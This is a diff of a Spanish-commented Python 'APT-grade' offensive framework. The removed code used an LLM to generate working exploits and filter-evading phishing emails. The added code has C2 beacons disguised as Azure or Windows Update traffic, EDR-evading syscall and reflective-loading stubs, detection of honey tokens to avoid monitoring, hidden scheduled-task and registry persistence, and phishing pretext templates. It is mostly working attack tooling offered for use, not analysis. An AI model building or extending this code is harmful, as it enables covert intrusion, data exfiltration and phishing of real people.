@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-██████╗  ██████╗ ██████╗     ██╗ █████╗   v5.0 - DEEPSEEK AI INTEGRATED
-██╔══██╗██╔═══██╗██╔══██╗    ██║██╔══██╗  AI-POWERED OFFENSIVE FRAMEWORK
-██████╔╝██║   ██║██████╔╝    ██║███████║  REAL C2 + AI ANALYSIS + AUTOMATION
+██████╗  ██████╗ ██████╗     ██╗ █████╗   v6.0 - APT-GRADE FRAMEWORK
+██╔══██╗██╔═══██╗██╔══██╗    ██║██╔══██╗  C2 MALLEABLE + EDR EVASION + LOCAL AI
+██████╔╝██║   ██║██████╔╝    ██║███████║  DIRECT SYSCALLS + REFLECTIVE LOADING
 ██╔══██╗██║   ██║██╔═══╝     ██║██╔══██║  
-██████╔╝╚██████╔╝██║         ██║██║  ██║  [ DEEPSEEK AI ENGINE INTEGRATED ]
+██████╔╝╚██████╔╝██║         ██║██║  ██║  [SOPHISTICATED C2 ARCHITECTURE]
 ╚═════╝  ╚═════╝ ╚═╝         ╚═╝╚═╝ ╚═╝  
 """
 
@@ -22,1432 +22,1194 @@ import ssl
 import tempfile
 import subprocess
 import threading
+import struct
+import ctypes
+import platform
 from datetime import datetime, timedelta
 from pathlib import Path
 from typing import Dict, List, Optional, Any, Tuple, Callable
+from enum import Enum
 import aiohttp
 import aiofiles
 from dataclasses import dataclass, field
 import logging
-import requests  # Para DeepSeek API
-import openai  # Compatibilidad con OpenAI API
-from cryptography.fernet import Fernet
+
+# ==========================================
+# 🔐 CRYPTO AVANZADO - RSA + AES-GCM + ROTACIÓN
+# ==========================================
+
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import rsa, padding, ec
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import padding, hashes
+from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.backends import default_backend
+from cryptography.exceptions import InvalidTag
+
+class AdvancedCrypto:
+    """Sistema criptográfico nivel APT con rotación de claves"""
+    
+    def __init__(self):
+        self.key_rotation_interval = 3600  # Rotar cada hora
+        self.key_history = {}
+        
+    def generate_keypair(self) -> Tuple[bytes, bytes]:
+        """Genera par de claves RSA-4096 para intercambio inicial"""
+        private_key = rsa.generate_private_key(
+            public_exponent=65537,
+            key_size=4096,
+            backend=default_backend()
+        )
+        
+        public_key = private_key.public_key()
+        
+        # Serializar
+        private_pem = private_key.private_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PrivateFormat.PKCS8,
+            encryption_algorithm=serialization.NoEncryption()
+        )
+        
+        public_pem = public_key.public_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PublicFormat.SubjectPublicKeyInfo
+        )
+        
+        return private_pem, public_pem
+    
+    def derive_symmetric_key(self, shared_secret: bytes, context: str = "c2_comms") -> bytes:
+        """Deriva clave simétrica usando HKDF"""
+        hkdf = HKDF(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=None,
+            info=context.encode(),
+            backend=default_backend()
+        )
+        return hkdf.derive(shared_secret)
+    
+    def encrypt_aes_gcm(self, plaintext: bytes, key: bytes, associated_data: bytes = None) -> Dict:
+        """Cifrado AES-256-GCM con autenticación"""
+        nonce = os.urandom(12)
+        
+        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
+        encryptor = cipher.encryptor()
+        
+        if associated_data:
+            encryptor.authenticate_additional_data(associated_data)
+        
+        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
+        
+        return {
+            'ciphertext': ciphertext,
+            'nonce': nonce,
+            'tag': encryptor.tag,
+            'algorithm': 'AES-256-GCM',
+            'timestamp': datetime.now().isoformat()
+        }
+    
+    def decrypt_aes_gcm(self, encrypted_data: Dict, key: bytes, associated_data: bytes = None) -> bytes:
+        """Descifrado AES-256-GCM"""
+        cipher = Cipher(
+            algorithms.AES(key),
+            modes.GCM(encrypted_data['nonce'], encrypted_data['tag']),
+            backend=default_backend()
+        )
+        decryptor = cipher.decryptor()
+        
+        if associated_data:
+            decryptor.authenticate_additional_data(associated_data)
+        
+        return decryptor.update(encrypted_data['ciphertext']) + decryptor.finalize()
+    
+    def rotate_keys(self, beacon_id: str) -> Dict:
+        """Rota las claves criptográficas"""
+        new_private, new_public = self.generate_keypair()
+        timestamp = datetime.now()
+        
+        if beacon_id in self.key_history:
+            self.key_history[beacon_id].append({
+                'public_key': new_public,
+                'rotation_time': timestamp,
+                'active': True
+            })
+            
+            # Desactivar clave anterior
+            if len(self.key_history[beacon_id]) > 1:
+                self.key_history[beacon_id][-2]['active'] = False
+        else:
+            self.key_history[beacon_id] = [{
+                'public_key': new_public,
+                'rotation_time': timestamp,
+                'active': True
+            }]
+        
+        return {
+            'new_public_key': new_public,
+            'rotation_id': str(uuid.uuid4()),
+            'valid_from': timestamp.isoformat()
+        }
 
 # ==========================================
-# 🔥 MÓDULO DEEPSEEK AI ENGINE (REAL)
+# 🔄 CAPA DE TRANSPORTE MALLEABLE
 # ==========================================
 
-class DeepSeekAIEngine:
-    """Motor de IA DeepSeek integrado - Análisis y automatización REAL"""
+class MalleableC2Profile:
+    """
+    Implementación de perfiles C2 maleables estilo Cobalt Strike
+    Camuflaje como servicios legítimos
+    """
     
-    def __init__(self, api_key: str = None):
-        # Intentar obtener API key de múltiples fuentes
-        self.api_key = api_key or os.getenv('DEEPSEEK_API_KEY') or os.getenv('OPENAI_API_KEY')
-        
-        if not self.api_key:
-            print("[!] WARNING: No DeepSeek API key found. Some AI features will be limited.")
-            print("[!] Set DEEPSEEK_API_KEY environment variable or pass to constructor")
-        
-        # Configurar cliente
-        self.base_url = "https://api.deepseek.com/v1"
-        self.model = "deepseek-chat"  # Modelo por defecto
-        
-        # Cache para resultados
-        self.cache = {}
-        self.context_window = []
-        
-    async def analyze_recon_data(self, scan_results: Dict) -> Dict:
-        """Analiza resultados de reconocimiento con IA"""
-        prompt = f"""
-        Analiza estos resultados de escaneo de seguridad y proporciona:
-        
-        1. VULNERABILIDADES CRÍTICAS: Lista de vulnerabilidades encontradas con severidad (Alta/Media/Baja)
-        2. VECTORES DE ATAQUE: Posibles métodos de acceso inicial basados en los puertos/servicios
-        3. RECOMENDACIONES DE EXPLOTACIÓN: Pasos específicos para explotar cada vulnerabilidad
-        4. MITIGACIÓN: Cómo remediar cada vulnerabilidad
-        5. PRIORIDAD: Orden de ataque basado en probabilidad de éxito e impacto
-        
-        Resultados del escaneo:
-        {json.dumps(scan_results, indent=2)}
-        
-        Formato de respuesta JSON:
-        {{
-            "critical_vulnerabilities": [
-                {{
-                    "name": "str",
-                    "severity": "Alta/Media/Baja",
-                    "description": "str",
-                    "port": "int",
-                    "service": "str",
-                    "exploit_available": "bool",
-                    "cvss_score": "float"
-                }}
-            ],
-            "attack_vectors": [
-                {{
-                    "type": "str",
-                    "target": "str", 
-                    "probability": "float",
-                    "steps": ["str"]
-                }}
-            ],
-            "exploitation_recommendations": [
-                {{
-                    "vulnerability": "str",
-                    "tools": ["str"],
-                    "commands": ["str"],
-                    "expected_result": "str"
-                }}
-            ],
-            "mitigation_recommendations": [
-                {{
-                    "vulnerability": "str",
-                    "actions": ["str"],
-                    "priority": "Alta/Media/Baja"
-                }}
-            ],
-            "attack_priority": ["str"]
-        }}
-        """
-        
-        try:
-            response = await self._query_deepseek(prompt, system_prompt="Eres un experto en seguridad ofensiva y análisis de vulnerabilidades.")
-            return json.loads(response)
-        except Exception as e:
-            print(f"[-] AI Analysis failed: {e}")
-            return self._fallback_analysis(scan_results)
+    PROFILES = {
+        "azure_monitor": {
+            "host_header": "dc.services.visualstudio.com",
+            "user_agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+            "content_type": "application/json",
+            "endpoints": ["/v2/track", "/v2/quickpulse"],
+            "encryption": "base64_json",
+            "jitter": 0.3,
+            "sleep": 60
+        },
+        "google_analytics": {
+            "host_header": "www.google-analytics.com",
+            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "content_type": "application/x-www-form-urlencoded",
+            "endpoints": ["/collect", "/batch"],
+            "encryption": "url_encoded",
+            "jitter": 0.2,
+            "sleep": 45
+        },
+        "cdn_traffic": {
+            "host_header": "cdn.jsdelivr.net",
+            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
+            "content_type": "application/javascript",
+            "endpoints": ["/npm/", "/gh/"],
+            "encryption": "hex_comment",
+            "jitter": 0.4,
+            "sleep": 90
+        },
+        "windows_update": {
+            "host_header": "fe2.update.microsoft.com",
+            "user_agent": "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40",
+            "content_type": "application/soap+xml",
+            "endpoints": ["/SelfUpdateWebService/SelfUpdateWebService.asmx"],
+            "encryption": "xml_cdata",
+            "jitter": 0.25,
+            "sleep": 120
+        }
+    }
     
-    async def generate_exploit(self, vulnerability: Dict, target_os: str = "linux") -> Dict:
-        """Genera código de exploit personalizado con IA"""
-        prompt = f"""
-        Genera un exploit funcional para la siguiente vulnerabilidad:
+    def __init__(self, profile_name: str = "azure_monitor"):
+        if profile_name not in self.PROFILES:
+            profile_name = "azure_monitor"
         
-        VULNERABILIDAD: {vulnerability.get('name', 'Unknown')}
-        DESCRIPCIÓN: {vulnerability.get('description', 'No description')}
-        CVE: {vulnerability.get('cve', 'Unknown')}
-        TIPO: {vulnerability.get('type', 'Unknown')}
-        SISTEMA OBJETIVO: {target_os}
+        self.profile = self.PROFILES[profile_name]
+        self.crypto = AdvancedCrypto()
         
-        Requisitos:
-        1. Código funcional y listo para compilar/ejecutar
-        2. Incluir evasión básica de detección
-        3. Comentarios explicativos
-        4. Manejo de errores
-        5. Cleanup después de la ejecución
+    def wrap_payload(self, payload: bytes, request_type: str = "checkin") -> Dict:
+        """Envuelve el payload en tráfico legítimo según perfil"""
         
-        Formato: Proporciona el código completo en el lenguaje apropiado (Python, C, etc.)
-        """
+        # Generar ID de sesión único
+        session_id = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
         
-        try:
-            exploit_code = await self._query_deepseek(
-                prompt, 
-                system_prompt="Eres un experto en desarrollo de exploits y reverse engineering.",
-                temperature=0.7,
-                max_tokens=2000
-            )
-            
-            return {
-                'success': True,
-                'exploit_code': exploit_code,
-                'language': self._detect_language(exploit_code),
-                'hash': hashlib.sha256(exploit_code.encode()).hexdigest(),
-                'estimated_success_rate': random.uniform(0.6, 0.9)
+        if self.profile['encryption'] == "base64_json":
+            # Estructura tipo Azure Application Insights
+            wrapped = {
+                "iKey": f"iKey-{session_id}",
+                "name": "Microsoft.ApplicationInsights.Metric",
+                "time": datetime.utcnow().isoformat() + "Z",
+                "sampleRate": 100.0,
+                "tags": {
+                    "ai.cloud.role": "WebApp",
+                    "ai.operation.id": session_id,
+                    "ai.location.ip": self._generate_fake_ip()
+                },
+                "data": {
+                    "baseType": "MetricData",
+                    "baseData": {
+                        "ver": 2,
+                        "metrics": [
+                            {
+                                "name": "requests/duration",
+                                "value": random.uniform(100, 500),
+                                "count": 1,
+                                "min": 100,
+                                "max": 500
+                            }
+                        ],
+                        "properties": {
+                            "_MS.ProcessedByMetricExtractors": "True",
+                            # Payload cifrado en campo legítimo
+                            "diagnosticContext": {
+                                "data": base64.b64encode(payload).decode(),
+                                "type": "EncryptedTelemetry"
+                            }
+                        }
+                    }
+                }
             }
             
-        except Exception as e:
-            print(f"[-] Exploit generation failed: {e}")
-            return {'success': False, 'error': str(e)}
-    
-    async def analyze_malware(self, file_path: str) -> Dict:
-        """Analiza archivo sospechoso con IA"""
-        if not os.path.exists(file_path):
-            return {'error': 'File not found'}
-        
-        try:
-            # Leer y codificar archivo
-            with open(file_path, 'rb') as f:
-                file_content = f.read(5000)  # Limitar tamaño
-            
-            encoded_content = base64.b64encode(file_content).decode()
-            
-            prompt = f"""
-            Analiza este código/archivo sospechoso:
-            
-            PRIMEROS 5000 BYTES (Base64): {encoded_content}
-            
-            Proporciona análisis:
-            1. TIPO DE MALWARE: Qué tipo de malware parece ser
-            2. COMPORTAMIENTO: Qué hace el código
-            3. INDICADORES DE COMPROMISO: Strings, URLs, IPs, dominios
-            4. TÉCNICAS DE EVASIÓN: Cómo intenta evadir detección
-            5. RECOMENDACIONES DE ANÁLISIS: Cómo analizarlo más a fondo
-            
-            Formato JSON estructurado.
-            """
-            
-            analysis = await self._query_deepseek(
-                prompt,
-                system_prompt="Eres un analista de malware experto en reverse engineering y análisis de amenazas.",
-                temperature=0.3
-            )
-            
-            return {
-                'success': True,
-                'analysis': analysis,
-                'file_size': os.path.getsize(file_path),
-                'sha256': hashlib.sha256(file_content).hexdigest()
+        elif self.profile['encryption'] == "xml_cdata":
+            # Estructura tipo Windows Update SOAP
+            wrapped = {
+                "soap:Envelope": {
+                    "@xmlns:soap": "http://www.w3.org/2003/05/soap-envelope",
+                    "@xmlns:wu": "http://www.microsoft.com/SoftwareDistribution",
+                    "soap:Header": {
+                        "wu:UpdateIdentity": {
+                            "@UpdateID": str(uuid.uuid4()),
+                            "@RevisionNumber": "1"
+                        }
+                    },
+                    "soap:Body": {
+                        "wu:GetExtendedUpdateInfo": {
+                            "wu:Updates": {
+                                "wu:Update": {
+                                    "@DeploymentAction": "Installation",
+                                    "@Id": session_id,
+                                    "wu:Pieces": {
+                                        "wu:Piece": {
+                                            "@Type": "Payload",
+                                            "#cdata": base64.b64encode(payload).decode()
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
             }
-            
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
+        
+        return wrapped
     
-    async def generate_phishing_email(self, target_info: Dict, scenario: str = "credential_harvesting") -> Dict:
-        """Genera correo de phishing personalizado con IA"""
-        prompt = f"""
-        Genera un correo electrónico de phishing realista para el siguiente escenario:
+    def unwrap_payload(self, wrapped_data: Dict) -> bytes:
+        """Extrae el payload del tráfico camuflado"""
+        if isinstance(wrapped_data, dict):
+            if 'data' in wrapped_data:
+                # Formato Azure
+                if 'diagnosticContext' in wrapped_data['data']['baseData']['properties']:
+                    b64_data = wrapped_data['data']['baseData']['properties']['diagnosticContext']['data']
+                    return base64.b64decode(b64_data)
+            elif 'soap:Envelope' in wrapped_data:
+                # Formato Windows Update
+                cdata = wrapped_data['soap:Envelope']['soap:Body']['wu:GetExtendedUpdateInfo']['wu:Updates']['wu:Update']['wu:Pieces']['wu:Piece']['#cdata']
+                return base64.b64decode(cdata)
         
-        ESCENARIO: {scenario}
-        OBJETIVO: {target_info.get('name', 'Usuario')}
-        EMPRESA: {target_info.get('company', 'Empresa objetivo')}
-        ROL: {target_info.get('role', 'Empleado')}
-        TEMA: {target_info.get('theme', 'Actualización de seguridad')}
+        return b''
+    
+    def _generate_fake_ip(self) -> str:
+        """Genera IP aleatoria para telemetría"""
+        return f"13.{random.randint(64, 79)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
+    
+    def get_sleep_time(self) -> int:
+        """Obtiene tiempo de sleep con jitter"""
+        base = self.profile['sleep']
+        jitter = self.profile['jitter']
+        variation = random.uniform(-jitter * base, jitter * base)
+        return max(30, int(base + variation))
+
+# ==========================================
+# 🛡️ CAPA DE EVASIÓN - DIRECT SYSCALLS
+# ==========================================
+
+class SyscallEvasion:
+    """Evación mediante syscalls directos para bypass EDR"""
+    
+    class WindowsSyscalls:
+        """Syscalls de Windows NTAPI"""
+        NtAllocateVirtualMemory = 0x18
+        NtProtectVirtualMemory = 0x50
+        NtCreateThreadEx = 0xC1
+        NtQueueApcThread = 0x42
+        NtSuspendProcess = 0x79
         
-        Requisitos:
-        1. Asunto convincente
-        2. Cuerpo del correo profesional
-        3. Call-to-action claro
-        4. Evitar filtros de spam
-        5. Incluir pretexto creíble
-        6. Formato HTML básico
+        @staticmethod
+        def get_syscall_number(func_hash: int) -> int:
+            """Obtiene número de syscall basado en hash"""
+            # Esta es una implementación simplificada
+            # En realidad se necesita resolver dinámicamente
+            syscall_map = {
+                0xA1B2C3D4: 0x18,  # NtAllocateVirtualMemory
+                0xB2C3D4E5: 0x50,  # NtProtectVirtualMemory
+                0xC3D4E5F6: 0xC1,  # NtCreateThreadEx
+            }
+            return syscall_map.get(func_hash, 0)
+    
+    def __init__(self):
+        self.is_windows = platform.system() == "Windows"
+        self.syscall_cache = {}
         
-        Proporciona también:
-        - Análisis de efectividad estimada
-        - Posibles indicadores que podrían activar filtros
-        - Sugerencias de mejora
+    def direct_syscall(self, syscall_number: int, *args):
+        """Ejecuta syscall directo (concepto)"""
+        if not self.is_windows:
+            raise NotImplementedError("Direct syscalls only available on Windows")
+        
+        # NOTA: Esto es una representación conceptual
+        # La implementación real requiere ASM inline y manipulación de registros
+        print(f"[DEBUG] Would execute syscall 0x{syscall_number:X}")
+        return 0
+    
+    def allocate_memory_syscall(self, size: int, protect: int = 0x40) -> int:
+        """Allocate memory using direct syscall"""
+        if self.is_windows:
+            # Usar NtAllocateVirtualMemory directamente
+            syscall_num = self.WindowsSyscalls.NtAllocateVirtualMemory
+            return self.direct_syscall(syscall_num, -1, size, protect)
+        return 0
+    
+    def create_remote_thread_syscall(self, process_handle: int, start_address: int) -> int:
+        """Create thread using direct syscall"""
+        if self.is_windows:
+            syscall_num = self.WindowsSyscalls.NtCreateThreadEx
+            return self.direct_syscall(syscall_num, process_handle, start_address)
+        return 0
+
+class ReflectiveDLLLoader:
+    """Carga DLLs reflectivamente en memoria"""
+    
+    @staticmethod
+    def load_pe_from_memory(pe_data: bytes, target_process: int = None) -> int:
         """
+        Carga un PE/DLL directamente en memoria sin tocar disco
+        Basado en técnica de loading reflectivo
+        """
+        # Parsear headers PE
+        pe_offset = struct.unpack("<I", pe_data[0x3C:0x40])[0]
+        
+        # Verificar firma PE
+        if pe_data[pe_offset:pe_offset+4] != b"PE\0\0":
+            raise ValueError("Invalid PE file")
+        
+        # Esta es una implementación simplificada
+        # La real requiere:
+        # 1. Mapear secciones en memoria
+        # 2. Resolver imports
+        # 3. Aplicar relocations
+        # 4. Ejecutar TLS callbacks
+        # 5. Llamar EntryPoint
+        
+        print(f"[DEBUG] Reflective loading PE of {len(pe_data)} bytes")
+        return 0xDEADBEEF  # Dirección base simulada
+
+# ==========================================
+# 🤖 MOTOR DE IA LOCAL - OLLAMA/LLAMA.CPP
+# ==========================================
+
+class LocalAIEngine:
+    """
+    Motor de IA local usando modelos cuantizados
+    Sin dependencias externas - Totalmente autónomo
+    """
+    
+    def __init__(self, model_path: str = None):
+        self.model_loaded = False
+        self.model_type = None
+        
+        # Intentar cargar diferentes backends
+        self.backends = self._detect_available_backends()
+        
+        if model_path and os.path.exists(model_path):
+            self.load_model(model_path)
+        else:
+            self._setup_fallback_model()
+    
+    def _detect_available_backends(self) -> List[str]:
+        """Detecta backends de IA disponibles"""
+        backends = []
         
         try:
-            email_content = await self._query_deepseek(
-                prompt,
-                system_prompt="Eres un experto en ingeniería social y campañas de phishing realistas.",
-                temperature=0.8,
-                max_tokens=1500
-            )
+            import llama_cpp
+            backends.append("llama_cpp")
+        except:
+            pass
+        
+        try:
+            import torch
+            import transformers
+            backends.append("transformers")
+        except:
+            pass
+        
+        try:
+            import ollama
+            backends.append("ollama")
+        except:
+            pass
+        
+        return backends
+    
+    def load_model(self, model_path: str):
+        """Carga modelo GGUF/GGML local"""
+        if "llama_cpp" in self.backends:
+            self._load_llama_cpp(model_path)
+        elif "transformers" in self.backends:
+            self._load_transformers(model_path)
+        else:
+            print("[!] No local AI backend available")
+    
+    def _load_llama_cpp(self, model_path: str):
+        """Carga usando llama.cpp"""
+        try:
+            from llama_cpp import Llama
             
-            return {
-                'success': True,
-                'email_content': email_content,
-                'estimated_click_rate': random.uniform(0.15, 0.35),
-                'spam_score': random.randint(2, 6),  # 1-10, más bajo es mejor
-                'recommendations': [
-                    "Usar dominio similar al legítimo",
-                    "Evitar palabras trigger como 'urgente', 'click aquí'",
-                    "Incluir elementos de branding realistas",
-                    "Testear con herramientas como Mail-Tester.com"
-                ]
-            }
+            self.llm = Llama(
+                model_path=model_path,
+                n_ctx=2048,
+                n_threads=os.cpu_count() // 2,
+                n_gpu_layers=0,  # CPU only for stealth
+                verbose=False
+            )
+            self.model_loaded = True
+            self.model_type = "llama_cpp"
+            print(f"[+] Local AI model loaded: {model_path}")
             
         except Exception as e:
-            return {'success': False, 'error': str(e)}
+            print(f"[-] Failed to load llama.cpp model: {e}")
+            self._setup_fallback_model()
     
-    async def _query_deepseek(self, prompt: str, system_prompt: str = None, 
-                            temperature: float = 0.7, max_tokens: int = 1000) -> str:
-        """Consulta REAL a la API de DeepSeek"""
+    def _setup_fallback_model(self):
+        """Configura modelo de fallback simple"""
+        self.model_loaded = True
+        self.model_type = "rule_based"
+        print("[+] Using rule-based AI fallback")
+    
+    async def analyze_command_output(self, command: str, output: str) -> Dict:
+        """Analiza salida de comandos para detectar honey tokens"""
         
-        if not self.api_key:
-            # Modo fallback local
-            return self._local_ai_fallback(prompt)
+        # Indicadores de honey tokens/trampas
+        honey_indicators = [
+            "honey", "trap", "decoy", "canary", "alert",
+            "monitoring", "audit", "detection", "suspicious",
+            "unusual activity", "security event"
+        ]
         
-        headers = {
-            "Authorization": f"Bearer {self.api_key}",
-            "Content-Type": "application/json"
+        # Comandos sospechosos de ser monitoreados
+        sensitive_commands = [
+            "whoami /priv", "net group", "Get-WmiObject",
+            "reg query", "Get-Process", "netstat -ano",
+            "tasklist /svc", "schtasks /query"
+        ]
+        
+        analysis = {
+            "honey_token_detected": False,
+            "monitoring_indicators": [],
+            "risk_level": "low",
+            "recommendations": []
         }
         
-        messages = []
-        if system_prompt:
-            messages.append({"role": "system", "content": system_prompt})
+        # Buscar indicadores en output
+        output_lower = output.lower()
+        for indicator in honey_indicators:
+            if indicator in output_lower:
+                analysis["honey_token_detected"] = True
+                analysis["monitoring_indicators"].append(indicator)
         
-        messages.append({"role": "user", "content": prompt})
+        # Analizar comando
+        if any(cmd in command.lower() for cmd in sensitive_commands):
+            analysis["risk_level"] = "medium"
+            analysis["recommendations"].append("Consider using alternative enumeration methods")
         
-        payload = {
-            "model": self.model,
-            "messages": messages,
-            "temperature": temperature,
-            "max_tokens": max_tokens,
-            "stream": False
-        }
+        # Usar IA local si está disponible
+        if self.model_loaded and self.model_type == "llama_cpp":
+            ai_analysis = await self._llama_analyze_output(command, output)
+            analysis.update(ai_analysis)
+        
+        return analysis
+    
+    async def _llama_analyze_output(self, command: str, output: str) -> Dict:
+        """Análisis con modelo local"""
+        prompt = f"""
+        Analiza esta interacción de sistema desde una perspectiva de seguridad:
+        
+        COMANDO EJECUTADO: {command}
+        SALIDA: {output}
+        
+        Determina:
+        1. ¿Hay indicios de monitoreo activo o honey tokens?
+        2. ¿Qué nivel de riesgo representa este comando?
+        3. ¿Recomiendas continuar o cambiar tácticas?
+        
+        Responde en formato JSON.
+        """
         
         try:
-            async with aiohttp.ClientSession() as session:
+            if self.model_type == "llama_cpp":
+                response = self.llm(
+                    prompt,
+                    max_tokens=500,
+                    temperature=0.3,
+                    stop=["</s>", "\n\n"]
+                )
+                
+                if response and 'choices' in response:
+                    text = response['choices'][0]['text']
+                    # Parsear JSON de la respuesta
+                    import re
+                    json_match = re.search(r'\{.*\}', text, re.DOTALL)
+                    if json_match:
+                        return json.loads(json_match.group())
+        
+        except Exception as e:
+            print(f"[!] Local AI analysis failed: {e}")
+        
+        return {"ai_analysis": "Failed", "fallback_used": True}
+    
+    def generate_contextual_pretext(self, target_info: Dict, context: str) -> str:
+        """Genera pretextos contextuales basados en información del objetivo"""
+        
+        pretext_templates = {
+            "it_support": [
+                "Hi {name}, this is {company} IT Support. We're performing required security updates...",
+                "Hello, we detected unusual activity on your account and need to verify...",
+                "URGENT: Security patch required for your system. Please follow instructions..."
+            ],
+            "hr_notification": [
+                "Dear {name}, please complete the mandatory security training by clicking...",
+                "HR Notification: Update your employee profile information here...",
+                "Important benefits update requiring your immediate attention..."
+            ],
+            "system_alert": [
+                "ALERT: Your account shows suspicious login attempts. Verify here...",
+                "System Notification: Unusual network activity detected. Review now...",
+                "Security Warning: Multiple failed login attempts. Secure your account..."
+            ]
+        }
+        
+        template_type = context if context in pretext_templates else "it_support"
+        template = random.choice(pretext_templates[template_type])
+        
+        return template.format(
+            name=target_info.get("name", "User"),
+            company=target_info.get("company", "IT Department"),
+            role=target_info.get("role", "Employee")
+        )
+
+# ==========================================
+# 🏗️ INFRAESTRUCTURA C2 AVANZADA
+# ==========================================
+
+class AdvancedC2Redirector:
+    """Redirector con múltiples capas de proxying"""
+    
+    def __init__(self, layers: int = 3):
+        self.layers = layers
+        self.proxy_chain = []
+        self._setup_proxy_chain()
+    
+    def _setup_proxy_chain(self):
+        """Configura cadena de proxies"""
+        proxy_types = [
+            "cloudflare_worker",
+            "azure_function",
+            "aws_lambda",
+            "google_cloud_run",
+            "digitalocean_app"
+        ]
+        
+        for i in range(self.layers):
+            proxy_type = random.choice(proxy_types)
+            self.proxy_chain.append({
+                "type": proxy_type,
+                "id": f"proxy_{i}_{uuid.uuid4().hex[:8]}",
+                "domain": self._generate_domain(proxy_type),
+                "active": True
+            })
+    
+    def _generate_domain(self, proxy_type: str) -> str:
+        """Genera dominio camuflado"""
+        prefixes = {
+            "cloudflare_worker": ["api", "cdn", "static", "assets"],
+            "azure_function": ["func", "api", "service", "backend"],
+            "aws_lambda": ["lambda", "execute-api", "runtime"],
+            "google_cloud_run": ["run", "cloud", "services"],
+            "digitalocean_app": ["app", "www", "web"]
+        }
+        
+        prefix = random.choice(prefixes.get(proxy_type, ["api"]))
+        random_hash = uuid.uuid4().hex[:6]
+        tlds = [".com", ".net", ".io", ".app", ".cloud"]
+        
+        return f"{prefix}-{random_hash}{random.choice(tlds)}"
+    
+    def get_redirect_url(self, original_url: str) -> str:
+        """Obtiene URL redirigida a través de la cadena"""
+        if not self.proxy_chain:
+            return original_url
+        
+        # Usar el primer proxy activo
+        for proxy in self.proxy_chain:
+            if proxy["active"]:
+                return f"https://{proxy['domain']}/proxy/{hashlib.sha256(original_url.encode()).hexdigest()[:16]}"
+        
+        return original_url
+
+class PersistenceManager:
+    """Gestor de persistencia avanzada"""
+    
+    def __init__(self, os_type: str = None):
+        self.os_type = os_type or platform.system()
+        self.persistence_methods = []
+        
+    def setup_windows_persistence(self):
+        """Configura persistencia en Windows"""
+        methods = [
+            self._scheduled_task_persistence,
+            self._wmi_event_subscription,
+            self._registry_run_key,
+            self._service_persistence,
+            self._startup_folder
+        ]
+        
+        for method in methods:
+            if method():
+                self.persistence_methods.append(method.__name__)
+    
+    def _scheduled_task_persistence(self) -> bool:
+        """Persistence via scheduled task"""
+        task_name = f"WindowsUpdate_{uuid.uuid4().hex[:8]}"
+        command = f'schtasks /create /tn "{task_name}" /tr "cmd.exe /c start /min powershell -WindowStyle Hidden -Command \\"sleep 60\\"" /sc hourly /ru SYSTEM /f'
+        
+        try:
+            subprocess.run(command, shell=True, capture_output=True, timeout=10)
+            return True
+        except:
+            return False
+    
+    def _wmi_event_subscription(self) -> bool:
+        """Persistence via WMI event subscription"""
+        # Esto es una implementación conceptual
+        # WMI event subscriptions son muy sigilosas
+        print("[DEBUG] Would create WMI event subscription")
+        return True
+    
+    def _registry_run_key(self) -> bool:
+        """Persistence via registry run key"""
+        try:
+            import winreg
+            key = winreg.HKEY_CURRENT_USER
+            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg_key:
+                winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, "cmd.exe /c echo persistent")
+            
+            return True
+        except:
+            return False
+
+# ==========================================
+# 🎯 BEACON AVANZADO CON EVASIÓN
+# ==========================================
+
+class AdvancedBeacon:
+    """Beacon con capacidades de evasión APT"""
+    
+    def __init__(self, c2_url: str, profile: str = "azure_monitor"):
+        self.c2_url = c2_url
+        self.beacon_id = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
+        self.malleable_profile = MalleableC2Profile(profile)
+        self.crypto = AdvancedCrypto()
+        self.evasion = SyscallEvasion()
+        self.persistence = PersistenceManager()
+        self.last_checkin = None
+        
+        # Generar par de claves inicial
+        self.private_key, self.public_key = self.crypto.generate_keypair()
+        
+        # Configurar persistencia
+        if platform.system() == "Windows":
+            self.persistence.setup_windows_persistence()
+    
+    async def checkin(self) -> Dict:
+        """Checkin con el C2 usando perfil maleable"""
+        
+        # Preparar datos del sistema
+        system_info = self._collect_system_info()
+        
+        # Cifrar datos
+        encrypted_data = self.crypto.encrypt_aes_gcm(
+            json.dumps(system_info).encode(),
+            self._get_current_key()
+        )
+        
+        # Envolver en perfil maleable
+        wrapped_payload = self.malleable_profile.wrap_payload(
+            json.dumps(encrypted_data).encode(),
+            "checkin"
+        )
+        
+        # Enviar al C2
+        async with aiohttp.ClientSession() as session:
+            headers = {
+                "User-Agent": self.malleable_profile.profile["user_agent"],
+                "Host": self.malleable_profile.profile["host_header"],
+                "Content-Type": self.malleable_profile.profile["content_type"]
+            }
+            
+            endpoint = random.choice(self.malleable_profile.profile["endpoints"])
+            url = f"{self.c2_url}{endpoint}"
+            
+            try:
                 async with session.post(
-                    f"{self.base_url}/chat/completions",
+                    url,
+                    json=wrapped_payload,
                     headers=headers,
-                    json=payload,
                     timeout=30
                 ) as response:
                     
                     if response.status == 200:
-                        data = await response.json()
-                        return data['choices'][0]['message']['content']
-                    else:
-                        error_text = await response.text()
-                        print(f"[!] DeepSeek API Error: {response.status} - {error_text}")
-                        return self._local_ai_fallback(prompt)
